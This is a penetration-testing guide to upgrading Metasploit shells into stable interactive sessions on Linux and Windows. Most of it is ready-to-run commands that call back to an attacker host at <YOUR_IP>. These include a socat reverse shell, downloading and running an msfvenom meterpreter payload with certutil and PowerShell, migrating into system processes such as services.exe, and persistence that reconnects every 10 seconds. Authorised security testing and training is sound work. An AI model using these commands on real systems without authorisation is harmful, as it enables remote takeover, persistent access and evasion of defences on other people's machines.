```markdown
# Obtaining Stable & Fully Interactive Shells in Metasploit/Meterpreter

A common frustration during penetration tests is landing a shell that is unstable, lacks job control (e.g., `Ctrl+C` kills the session), or doesn't support features like tab-completion or arrow keys for command history. This guide covers techniques to upgrade these basic shells to fully interactive, stable TTYs.

## 1. The Core Problem: Non-Interactive vs. Interactive Shells

*   **Non-Interactive Shell (`cmd`/`sh`):** The initial shell you get is often a simple, non-interactive process. It can execute commands but lacks a TTY (Teletypewriter), which is responsible for managing the terminal session, job control, and special characters.
*   **Symptoms of a Non-Interactive Shell:**
    *   No command history (arrow keys don't work).
    *   `Ctrl+C` kills the entire session instead of the foreground process.
    *   Programs like `su`, `ssh`, `vim`, or `top` do not work correctly or at all.
    *   No tab-completion.
    *   Commands with fancy output (`nano`, `menuconfig`) appear garbled.

## 2. The Ultimate Goal: A Fully Interactive TTY

The goal is to emulate a real terminal (TTY). This can be achieved using several methods, depending on the target environment and available tools.

## 3. Stabilizing Linux/Unix Shells

After gaining a basic shell (e.g., via a `php/web_delivery` or `reverse_tcp` payload), use one of these methods.

### Method 1: The Canonical Python PTY Method
This is the most reliable method on systems with Python installed.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
To further upgrade it to a fully featured terminal:
```bash
# Step 1: Use Python to spawn a PTY
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell with Ctrl+Z
# Step 3: On YOUR machine, set your terminal to pass through stty settings
stty raw -echo; fg

# Step 4: Press Enter once or twice. Then, inside the new shell, set the terminal type and sane stty settings.
export TERM=xterm-256color
stty rows 50 columns 120
```

### Method 2: Using `script`
Some systems have the `script` utility, which can be surprisingly effective.
```bash
script -q /dev/null /bin/bash
```

### Method 3: Using socat or nc
This is the most stable method but requires uploading a binary.
1.  **On Your Attacker Machine:**
    ```bash
    # Create a symlink to socat for easy download
    sudo cp $(which socat) .
    sudo python3 -m http.server 80
    ```
2.  **On The Target Machine:**
    ```bash
    # Download socat
    wget http://<YOUR_IP>/socat -O /tmp/socat; chmod +x /tmp/socat

    # Set up a listener on the target that connects your input to a TTY
    # Attacker: nc -lvnp 443
    /tmp/socat TCP:<YOUR_IP>:443 EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane
    ```
    This will give you a fully interactive shell on your netcat listener.

### Method 4: Metasploit's Built-in Upgrade
If you have a `shell` session, you can often use a Metasploit post module.
```bash
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(shell_to_meterpreter) > set SESSION <your_session_id>
msf6 post(shell_to_meterpreter) > run
```
This will create a new Meterpreter session, which is much more stable than a basic shell.

## 4. Stabilizing Windows Shells

Windows shells (`cmd.exe`) are generally more stable than Unix non-TTY shells but lack many features. The best option is almost always to **migrate to a Meterpreter session**.

### Method 1: Upgrade to Meterpreter (Recommended)
If you have a regular `windows/shell/reverse_tcp` session, use the same post module as for Linux.
```bash
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(shell_to_meterpreter) > set SESSION <your_session_id>
msf6 post(shell_to_meterpreter) > run
```

### Method 2: Use PowerShell to Invoke a Better Payload
You can use the existing shell to download and execute a Meterpreter payload.
1.  **Generate a Meterpreter Payload:**
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<YOUR_IP> LPORT=443 -f exe -o met.exe
    ```
2.  **Host it on a web server:**
    ```bash
    sudo python3 -m http.server 80
    ```
3.  **In the basic Windows shell, download and execute it:**
    ```cmd
    certutil -urlcache -split -f http://<YOUR_IP>/met.exe met.exe
    met.exe
    ```
    Or, using PowerShell from a `cmd` shell:
    ```cmd
    powershell -c "Invoke-WebRequest -Uri 'http://<YOUR_IP>/met.exe' -OutFile 'met.exe'; Start-Process met.exe"
    ```

## 5. Advanced Meterpreter Stability: Persistence & Migration

A Meterpreter session is great, but it can die if the exploited process crashes. To make it stable and persistent:

### Technique 1: Process Migration
**Always migrate your Meterpreter session to a stable, long-running process.**
```bash
meterpreter > getpid # Shows your current process ID
meterpreter > ps      # Lists running processes

# Look for stable processes like:
# - services.exe (Runs as SYSTEM, very stable)
# - svchost.exe   (Numerous, system processes)
# - lsass.exe     (Runs as SYSTEM, but may be protected by EDR/AV)
# - explorer.exe  (Runs as user, stable if user is logged in)

meterpreter > migrate <PID_OF_SERVICES.EXE>
```
**Benefits:** Your session survives if the original exploited application (e.g., a web server) is restarted. It also runs under the security context (privileges) of the new process.

### Technique 2: Running Persistence
If you have the appropriate privileges, use Meterpreter's persistence script to survive reboots.
```bash
meterpreter > run persistence -h
# Example: This connects back every 10 seconds on port 443 via HTTPS, using the default AutoRunScript
meterpreter > run persistence -U -i 10 -p 443 -r <YOUR_IP>
```
**Note:** This is noisy and easily detectable by modern EDR solutions. Use with caution.

## 6. Summary & Preferred Workflow

1.  **Initial Compromise:** Get any kind of shell using Metasploit (`reverse_tcp`, `web_delivery`, etc.).
2.  **Immediate Upgrade:**
    *   **Linux:** Use the Python PTY method for a semi-stable TTY.
    *   **Windows / Universal:** Run `post/multi/manage/shell_to_meterpreter` to get a Meterpreter session.
3.  **Stabilize:**
    *   **Meterpreter:** Immediately `migrate` to a stable system process like `services.exe`.
    *   **Linux TTY:** Use the full `python3 + stty` method or upload `socat` for the best stability.
4.  **Persistence (Optional):** Use Meterpreter's `persistence` script or other methods only if necessary for the goals of the assessment.
```